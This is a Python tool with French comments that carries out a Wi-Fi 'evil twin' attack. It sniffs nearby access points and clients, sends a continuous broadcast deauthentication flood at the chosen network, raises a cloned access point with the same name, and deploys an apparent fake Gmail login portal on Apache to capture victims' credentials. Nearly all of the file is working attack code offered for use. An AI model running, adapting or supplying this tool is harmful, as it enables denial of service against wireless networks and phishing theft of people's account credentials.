#!/usr/bin/env python3


import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp
import subprocess
import os
import threading
import signal
import time
import sys
from datetime import datetime
import json
import getopt
#from subprocess import Popen, PIPE

class cli_colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



def animated_loading():
    """For animation"""
    chars = "/—\|"
    for char in chars:
        sys.stdout.write(cli_colors.OKGREEN + '\r'+'...'+char)
        time.sleep(.1)
        sys.stdout.flush()

def list_ifaces():
    """List all availables interfaces"""
    return scapy.get_if_list()

class Interface():
    """Classe Interface, to manage all things related to interface"""
    def __init__(self, iface, stop=False):
        self.stop = stop
        self.iface = iface
        ##timeout=20
    def change_channel(self,timeout=20, sleeps=1, channel=1):
        """Method for changing channel every """
        channel = channel
        timeout = timeout
        sleeps = sleeps
        signal.alarm(timeout)
        while not self.stop:
            cmd = ['iw', str(self.iface), 'set', 'channel', str(channel)]
            # Another way to run command
            subprocess.run(cmd, capture_output=True, text=True)                               ### penser à l'enlever peut etre output
            channel = channel%13 + 1
            time.sleep(sleeps)

    def start_channel_change_thread(self, timeout=20, sleeps=1):
        """Thread that start channel changing and stop it after timeout"""
        change_ch_thread = threading.Thread(target = self.change_channel, args=(timeout, sleeps, ), daemon=True)
        change_ch_thread.start()
        #signal.pause()
        def sigalarm_handler_chan(sig, handler):
            self.stop = True
        signal.signal(signal.SIGALRM, sigalarm_handler_chan)
        return change_ch_thread

    def activ_monitor_mode(self):
        """ Activate monitor mode """
        v = True
        print(cli_colors.ENDC + cli_colors.BOLD + "[+] Activate monitor mode for " + self.iface )
        while v:
            animated_loading()
            time.sleep(1)
            v = False
        os.system('ifconfig ' + self.iface + ' down')
        r = subprocess.run(['iw', str(self.iface), 'set', 'type', 'monitor'], capture_output=True)
        os.system('ifconfig ' + self.iface + ' up')
        sys.stdout.write(cli_colors.OKGREEN + 'Done') 
        print()

    def activ_managed_mode(self):
        """ Activate monitor mode """
        v = True
        print(cli_colors.ENDC + cli_colors.BOLD + "[+] Activate managed mode for " + self.iface)
        while v:
            animated_loading()
            time.sleep(1)
            v = False
        os.system('ifconfig ' + self.iface + ' down')
        r = subprocess.run(['iw', str(self.iface), 'set', 'type', 'managed'], capture_output=True)
        os.system('ifconfig ' + self.iface + ' up')
        sys.stdout.write(cli_colors.OKGREEN + 'Done') 
        print()
    def test_injection(self, iface):
        r = subprocess.getoutput('aireplay-ng -9 ' + iface)
        print(r)


class Sniffer():
    """Class Sniffer, manage all things related to Sniff """
    all_accessP = {}
    accessP_and_clients = {}
    def __init__(self, iface):
        self.iface = iface
        self.Interface = Interface(iface)
    def ap_calback(self, pkt):
        """ Callback to get all AP """
        #pkt.show()  ###Don't forget here management type
        if ( pkt.haslayer(Dot11Beacon) ):
            if(pkt.addr2 is not None):
                animated_loading()
                bssid = pkt.addr2 
                ssid = pkt.info.decode()  # bytes so decode to get string
                channel = pkt[Dot11Beacon].network_stats()['channel']
                crypto = pkt[Dot11Beacon].network_stats()['crypto']
                accessP = {'bssid' : bssid, 'ssid' : ssid, 'channel' : str(channel), 'crypto' : crypto}
                if(accessP not in self.all_accessP):
                    self.all_accessP[bssid] = accessP
                    display = "SSID = "+ ssid + ", BSSID = " + bssid + ", Channel = " + str(channel) + ", Crypto = " + str(crypto)
                    print(cli_colors.ENDC + cli_colors.WARNING + display)

    def clients_ap_callback(self, pkt):
        """Callback to get connected clients"""
        if ( pkt.haslayer(Dot11Beacon) ):
            if(pkt.addr2 is not None):
                animated_loading()
                bssid = pkt.addr2 
                ssid = pkt.info.decode()  # bytes so decode to get string
                channel = pkt[Dot11Beacon].network_stats()['channel']
                crypto = pkt[Dot11Beacon].network_stats()['crypto']
                accessP = {'ssid' : ssid, 'channel' : str(channel), 'crypto' : crypto, 'clients': []}
                if(bssid not in self.accessP_and_clients):
                    self.accessP_and_clients[bssid] = accessP
        elif (pkt.type==2 ):  # data frame
            if(pkt.addr2 is not None and pkt.addr2 in self.accessP_and_clients and pkt.addr1 != "ff:ff:ff:ff:ff:ff"):
                bssid = pkt.addr2
                essid = pkt.addr1
                if essid not in self.accessP_and_clients[bssid]['clients']:
                    self.accessP_and_clients[bssid]['clients'].append(essid)

    def display_ap_clients(self):
        """Displaying AP and connected clients"""
        for bssid in self.accessP_and_clients:
            display = "BSSID = " + str(bssid) + ', ' +str(self.accessP_and_clients[bssid]) 
            print(cli_colors.ENDC + cli_colors.WARNING + display)
            display = str(len( self.accessP_and_clients[bssid]['clients'] )) + " clients"
            v= True
            while v:
                animated_loading()
                time.sleep(0.1)
                v = False
            v = True
            print(cli_colors.ENDC + cli_colors.WARNING + display)
            print()

    def get_ap(self):
        """Thread to get all AP"""
        self.Interface.activ_monitor_mode()
        chan_thread = self.Interface.start_channel_change_thread()
        print(cli_colors.ENDC + cli_colors.BOLD + "[+] Scanning network to find AccessPoint")
        a = scapy.AsyncSniffer(iface = self.iface, prn=self.ap_calback)
        a.start()
        chan_thread.join()
        chan_thread.stop = True
        a.stop()
        print("[+]Done ", end=" ")
        print( cli_colors.ENDC + cli_colors.FAIL + str(len(self.all_accessP)) + " access point founds")
        return self.all_accessP

    def get_clients_and_ap(self):
        """Thread to get AP and connected clients"""
        self.Interface.activ_monitor_mode()
        chan_thread = self.Interface.start_channel_change_thread(sleeps=1, timeout=60)
        print( cli_colors.ENDC + cli_colors.BOLD + "[+] Scanning network to find AccessPoint and clients")
        a = scapy.AsyncSniffer(iface = self.iface, prn=self.clients_ap_callback)
        a.start()
        chan_thread.join()
        chan_thread.stop = True
        a.stop()
        print("[+]Done ", end=" ")
        print( cli_colors.ENDC + cli_colors.FAIL + str(len(self.accessP_and_clients)) + " access point founds")
        return self.accessP_and_clients

    def choose_AP(self):
        """Choose AP method"""
        if( len(self.accessP_and_clients) > 0 ):
            ap = self.accessP_and_clients
        else:
            ap = self.all_accessP
        valid = False
        print(cli_colors.ENDC + cli_colors.BOLD + "[+] Choose one access point and write her BBSID : ", end="")
        while not valid:
            bssid = input(cli_colors.ENDC + cli_colors.BOLD)
            try:
                check = ap[bssid]
                valid = True
            except:
                valid = False
                print(cli_colors.ENDC + cli_colors.FAIL + "[+] Choose valid BSSID : ", end="")
                pass
        return bssid

    def deauth_all(self, bssid, channel, time=1):
        """Sending Deauth method"""
        self.Interface.activ_monitor_mode()
        channel = channel
        cmd = ['iw', str(self.iface), 'set', 'channel', str(channel)]
        subprocess.run(cmd, capture_output=True, text=True)
        pkt =  RadioTap()/Dot11(addr1 = "ff:ff:ff:ff:ff:ff", addr2 = bssid, addr3 = bssid)/Dot11Deauth(reason=1)
        #print(pkt)
        scapy.sendp(pkt, inter=0.1, count=time*600, iface=self.iface, verbose=0)
        #print('[+] Sending deauth packets from ' + bssid + ' to ' + broadcast + ' via channel ' + channel)

    def start_deauth(self, bssid, channel, time=1):
        deauth_thread = threading.Thread(target = self.deauth_all, args=(bssid, channel, time,), daemon=True)
        print('[+] Sending deauth packets from ' + bssid + ' to ff:ff:ff:ff:ff:ff' + ' via channel ' + channel)
        deauth_thread.start()
        return deauth_thread                 ######don't forget join and stop when use


def configWebApp():
    # Config portal
    print('[+] Copy file into /var/www//html...')
    os.system('rm -r /var/www/html/* 2>/dev/null')
    os.system('cp -r gmail /var/www/html/gmail')
    os.system('cp .htaccess /var/www/html')
    os.system('chmod 777 /var/www/html/.htaccess')
    os.system('chmod 777 /var/www/html/gmail')
    os.system('chmod 777 /var/www/html/gmail/ent')
    os.system('chmod 777 /var/www/html/gmail/ent/*')
    os.system('chmod 777 /var/www/html/gmail/*')
    print('[+] files copied succesfuly')

    # Enable rewrite and override for .htaccess and php
    print('[+] Configuring apache2 \n')
    os.system('cp -f gmail_site.conf /etc/apache2/conf-available/')
    os.system('a2enconf gmail_site')
    os.system('a2enmod rewrite')

    # Restart apache2
    os.system('service apache2 reload')
    os.system('service apache2 restart')

def create_newAP(iface, ssid, chan, encryption):
    os.system('chmod +x createAP.sh')
    os.system('./createAP.sh ' + iface + ' ' + ssid + ' ' + str(encryption) + ' ' + chan)

def main(argv):
    iface1 = ''
    iface2 = ''
    try:
        opts, args = getopt.getopt(argv[1:],"hd:n:",["help","deauth=","newAP="])
        if(len(opts) == 0 ): ##setuid
            print ("\n Usage:\t" + argv[0] + " -d <deauth_interface_to_use> -n <new_AP_interface>\n" )
            sys.exit(2)
    except getopt.GetoptError:
        print ("\n Usage:\t" + argv[0] + " -d <deauth_interface_to_use> -n <new_AP_interface>\n" )
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print ("\n Usage:\t" + argv[0] + " -d <deauth_interface_to_use> -n <new_AP_interface>\n" )
            sys.exit()
        elif opt in ("-d", "--deauth"):
            iface1 = arg
        elif opt in ("-n", "--newAP"):
            iface2 = arg
    if os.geteuid() != 0:
        print ("\nError: Run it s root\n")
        sys.exit(2)
    all_iface = list_ifaces()
    all_iface.remove('lo')
    if iface1 not in all_iface or iface2 not in all_iface:
        print("[+] Bad interface: Choose the right one between " + str(all_iface))
        sys.exit(2)
    Snif = Sniffer(iface1)
    aps = Snif.get_clients_and_ap()
    Snif.display_ap_clients()
    bssid = Snif.choose_AP()
    chan = aps[bssid]['channel']
    ssid = aps[bssid]['ssid']
    encryption = aps[bssid]['crypto']
    print(encryption)
    if( "OPN" not in str(encryption) ):
        print(cli_colors.ENDC + cli_colors.WARNING + "Le wifi n'est pas ouvert, souhaitez vous créer un Wifi Ouvert ?\nTapez O pour Oui et N pour Non: ",  end="")
        valid = False
        #print(cli_colors.ENDC + cli_colors.BOLD + "Choose one access point and write her BBSID : ", end="")
        while not valid:
            inp = input(cli_colors.ENDC + cli_colors.BOLD)
            if(inp == 'O' or inp == 'N'): 
                valid = True
                if inp == "O":
                    encryption = "OPN"
                else:
                    if "WPA2" in str(encryption):
                        encryption = "WPA2"
                    elif "WPA" in str(encryption):
                        encryption = "WPA"
                    else: 
                        encryption = "OPN"

            else:
                valid = False
                print(cli_colors.ENDC + cli_colors.WARNING + "Le wifi n'est pas ouvert, souhaitez vous créer un Wifi Ouvert ?\nTapez O pour Oui et N pour Non: ",  end="")
                pass
    print("SSID: " + str(ssid))
    print( "Channel: " +  str(chan))
    th = Snif.start_deauth(bssid, chan, 300)
	## Lauch newAP in new thread
    AP_thread = threading.Thread(target = create_newAP, args=(iface2, ssid, chan,encryption,), daemon=True)
    AP_thread.start()
    #Web app
    configWebApp()
    print('[+] Continue to send deauth packets from ' + str(bssid) + ' to ff:ff:ff:ff:ff:ff' + ' via channel ' + chan)
    th.join()    #####Join
    AP_thread.join

if __name__ == "__main__":
    try:  
        main(sys.argv)
    except KeyboardInterrupt:
        print (" Exit ")
        sys.exit(0)
    except:
        print (" Un problèe est survenu ")
        sys.exit(0)







